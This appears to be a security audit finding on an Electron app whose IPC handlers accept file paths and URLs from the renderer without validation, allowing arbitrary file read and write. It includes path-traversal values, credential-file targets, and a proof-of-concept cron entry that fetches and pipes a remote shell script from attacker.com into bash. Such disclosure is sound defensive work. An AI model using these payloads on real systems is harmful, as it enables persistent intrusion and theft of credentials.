### Title
Missing Input Validation on IPC-Received File Paths Enables Arbitrary File Write from Compromised Renderer

---

### Summary

The same vulnerability class from the external report — **missing input validation on data received via an IPC channel from an untrusted process** — exists in this codebase. Multiple Electron IPC handlers in the main process accept renderer-controlled file paths and write/read arbitrary filesystem locations without any path validation or sanitization. If the renderer process is compromised (e.g., via XSS), an attacker can leverage these handlers to write to arbitrary paths on the host filesystem.

---

### Finding Description

The external report describes `fd_bank` blindly consuming `fd_txn_p_t` data (including `payload_sz`) from `fd_pack` over IPC without bounds-checking, leading to memory corruption. The analog here is the Electron main process blindly consuming a renderer-supplied `filePath` over IPC and passing it directly to `fs.promises.writeFile` without any path validation.

**Finding 1 — `saveFileToPath` IPC handler (arbitrary file write)** [1](#0-0) 

The handler receives `filePath: string` from the renderer and performs only a truthiness check (`if (!filePath)`), then immediately writes to that path:

```ts
// utils.ts:164-166
if (!filePath) throw new Error('File path is undefined');
await fs.promises.writeFile(filePath, data);
```

There is no check that `filePath` is within an expected directory, no path normalization, and no extension restriction. A compromised renderer can supply `../../../../etc/cron.d/backdoor` or any other absolute path.

**Finding 2 — `writeTransactionFile` IPC handler (arbitrary file write)** [2](#0-1) 

The `filePath` parameter originates from the renderer via: [3](#0-2) 

The main-process implementation writes directly:

```ts
// transactionFile.ts:13-14
const data = JSON.stringify(transactionFile);
await fsp.writeFile(filePath, data, { encoding: 'utf8' });
```

No path validation is performed.

**Finding 3 — `readTransactionFile` IPC handler (arbitrary file read)** [4](#0-3) 

The renderer-supplied `filePath` is passed directly to `fsp.readFile`. A compromised renderer can read any file accessible to the main process (e.g., `~/.ssh/id_rsa`, environment files, SQLite databases).

**Finding 4 — `openExternal` without URL scheme validation** [5](#0-4) 

```ts
ipcMain.on(createChannelName('openExternal'), (_e, url: string) => shell.openExternal(url));
```

No scheme allowlist is enforced. A compromised renderer can pass `file:///etc/passwd` or a `javascript:` URI, depending on the OS handler.

---

### Impact Explanation

A compromised renderer process (e.g., via XSS in any web content loaded by the app, or a malicious dependency in the renderer bundle) can invoke these IPC channels through the preload-exposed API to:

- **Write arbitrary files** to any path writable by the Electron main process (which runs with full user privileges), enabling persistence (cron jobs, shell profiles, SSH authorized_keys) or overwriting application data.
- **Read arbitrary files** accessible to the main process, leaking private keys, credentials, or system files.

This is a direct process-to-process privilege escalation: the sandboxed renderer gains main-process filesystem capabilities through unvalidated IPC data, mirroring the `fd_pack → fd_bank` RCE path in the external report.

---

### Likelihood Explanation

Electron renderer processes are a well-known XSS target. The Electron security documentation explicitly warns that `shell.openExternal` and filesystem IPC handlers must validate their inputs because a compromised renderer is a realistic threat model. The preload script exposes `writeTransactionFile` and `saveFileToPath` directly to the renderer context: [6](#0-5) 

Any XSS in the Vue renderer, or a supply-chain compromise of a renderer-side npm package, provides a direct path to these handlers.

---

### Recommendation

1. **Validate and normalize all renderer-supplied paths** in the main process before any filesystem operation. Use `path.resolve()` and confirm the resolved path starts with an expected base directory (e.g., `app.getPath('userData')`).
2. **Add an allowlist of URL schemes** to the `openExternal` handler (e.g., only `https:` and `http:`).
3. **Apply the principle of least privilege**: IPC handlers that write files should use `dialog.showSaveDialog` to let the OS mediate the path selection, as `saveFile` already does correctly — `saveFileToPath` bypasses this safeguard entirely.

---

### Proof of Concept

With a compromised renderer (e.g., via XSS), an attacker calls:

```js
// From compromised renderer context
window.electronAPI.local.transactionFile.writeTransactionFile(
  { name: '*/5 * * * * root curl http://attacker.com/shell | bash' },
  '/etc/cron.d/pwned'
);
```

The main process executes:

```ts
// transactionFile.ts:13-14 — no path check
const data = JSON.stringify(transactionFile);
await fsp.writeFile('/etc/cron.d/pwned', data, { encoding: 'utf8' });
``` [2](#0-1) 

The file is written to the attacker-controlled path with no error, achieving persistent code execution on the host.
